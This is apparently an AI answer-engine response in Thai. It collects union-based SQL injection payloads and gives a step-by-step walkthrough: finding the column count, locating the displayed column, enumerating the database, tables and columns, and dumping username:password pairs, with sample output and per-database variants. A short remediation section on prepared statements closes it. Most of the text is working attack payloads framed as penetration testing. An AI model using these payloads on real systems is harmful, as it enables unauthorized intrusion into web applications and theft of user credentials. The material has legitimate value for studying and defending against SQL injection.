<img src="https://r2cdn.perplexity.ai/pplx-full-logo-primary-dark%402x.png" style="height:64px;margin-right:32px"/>

# รวม payloads สำหรับ SQLi แบบ Union based และตัวอย่างการใช้

**Union-based SQL Injection** คือเทคนิคที่แฮกเกอร์ใช้คำสั่ง `UNION` เพื่อ "เชื่อม" ผลลัพธ์จากตารางอื่น (ที่แอบขโมย) มาต่อท้ายผลลัพธ์ปกติของหน้าเว็บ ทำให้ข้อมูลความลับถูกแสดงออกมาทางหน้าจอครับ

นี่คือขั้นตอนและ Payloads สำหรับทดสอบ (Penetration Testing) ตามลำดับ:

***

### ขั้นตอนที่ 1: หาจำนวน Column (Column Enumeration)

ก่อนจะดึงข้อมูล ต้องรู้ก่อนว่าตารางปัจจุบันมีกี่ Column ไม่งั้น `UNION` จะ Error
**เทคนิค:** ใช้ `ORDER BY` แล้วเพิ่มเลขไปเรื่อยๆ จนกว่าหน้าเว็บจะ Error

* `' ORDER BY 1 -- ` (ปกติ)
* `' ORDER BY 2 -- ` (ปกติ)
* `' ORDER BY 3 -- ` (ปกติ)
* `' ORDER BY 4 -- ` (❌ หน้าเว็บ Error หรือข้อมูลหาย แสดงว่ามีแค่ 3 Column)

**Payloads แบบอื่นๆ:**

* `' UNION SELECT NULL --`
* `' UNION SELECT NULL, NULL --`
* `' UNION SELECT NULL, NULL, NULL --` (ถ้าหน้าเว็บกลับมาปกติ แสดงว่าเจอจำนวนที่ถูกต้องแล้ว)

***

### ขั้นตอนที่ 2: หาจุดแสดงผล (Finding the Injection Point)

เมื่อรู้จำนวน Column (สมมติว่า 3) ต้องหาว่า Column ไหนที่โชว์ข้อมูลบนหน้าจอ เพื่อจะเอาข้อมูลลับไปเสียบแทนที่

* **Payload:** `' UNION SELECT 'COL-1', 'COL-2', 'COL-3' --`
* **ผลลัพธ์:** หน้าเว็บอาจจะโชว์คำว่า `COL-2` บนหน้าจอ (เช่น แทนที่ชื่อสินค้า)
    * แสดงว่าเราสามารถขโมยข้อมูลผ่านช่องที่ 2 ได้ ✅

***

### ขั้นตอนที่ 3: ดึงข้อมูล Database (Database Enumeration)

เสียบฟังก์ชันดึงข้อมูลลงในช่องที่ 2 ที่เราเจอ

* **Payload (MySQL):**

```sql
' UNION SELECT NULL, database(), NULL --
' UNION SELECT NULL, user(), NULL --
' UNION SELECT NULL, @@version, NULL --
```

* **Payload (PostgreSQL):**

```sql
' UNION SELECT NULL, current_database(), NULL --
```


***

### ขั้นตอนที่ 4: ดึงชื่อตารางทั้งหมด (Table Dumping)

เมื่อรู้ชื่อ Database แล้ว (สมมติชื่อ `app_db`) ก็สั่งดึงชื่อตารางทั้งหมดออกมา

* **Payload (MySQL):**

```sql
' UNION SELECT NULL, group_concat(table_name), NULL FROM information_schema.tables WHERE table_schema = 'app_db' --
```

* **ผลลัพธ์:** หน้าเว็บจะโชว์: `users, products, orders, secrets`

***

### ขั้นตอนที่ 5: ดึงข้อมูลความลับ (Data Exfiltration)

เมื่อรู้ชื่อตารางเป้าหมาย (เช่น `users`) ก็ดึงชื่อ Column และข้อมูลข้างใน

**หาชื่อ Column:**

```sql
' UNION SELECT NULL, group_concat(column_name), NULL FROM information_schema.columns WHERE table_name = 'users' --
```

* **ผลลัพธ์:** `id, username, password, email`

**ดึงข้อมูล User \& Password:**

```sql
' UNION SELECT NULL, group_concat(username, ':', password), NULL FROM users --
```

* **ผลลัพธ์:** `admin:123456, user1:password` (ได้ข้อมูลครบเรียบร้อย)

***

### 📝 สรุป Payloads สำหรับแต่ละ Database

| Database | Payload ตัวอย่าง |
| :-- | :-- |
| **MySQL** | `' UNION SELECT 1, group_concat(username), 3 FROM users --` |
| **PostgreSQL** | `' UNION SELECT 1, string_agg(username, ','), 3 FROM users --` |
| **SQL Server** | `' UNION SELECT 1, string_agg(username, ','), 3 FROM users --` (SQL Server 2017+) |
| **Oracle** | `' UNION SELECT 1, listagg(username, ',') WITHIN GROUP (ORDER BY username), 3 FROM users --` |

### ⚠️ วิธีป้องกัน (Remediation)

* **ห้ามใช้ String Concatenation** (`"SELECT * FROM news WHERE id = " + id`) เด็ดขาด
* ใช้ **Prepared Statements** (Parameterized Query) เท่านั้น

```typescript
// ✅ Safe (NestJS/TypeORM)
connection.query('SELECT * FROM news WHERE id = $1', [id]);
```


<span style="display:none">[^1][^2][^3][^4][^5][^6][^7][^8]</span>

<div align="center">⁂</div>

[^1]: https://www.reddit.com/r/netsecstudents/comments/1mkxdqy/deep_dive_into_sql_injection_my_full_technical/

[^2]: https://www.knmasters.com/sql-injection-sqli/

[^3]: https://www.dcrub.com/sql-injection

[^4]: https://portswigger.net/web-security/sql-injection/union-attacks

[^5]: https://github.com/payloadbox/sql-injection-payload-list

[^6]: https://codinggun.com/security/sql-injection/

[^7]: https://mayaseven.com/th/sql-injection-แฮกยังไงและถ้าเว็บเร/

[^8]: https://libdoc.dpu.ac.th/thesis/Piya.Art.pdf

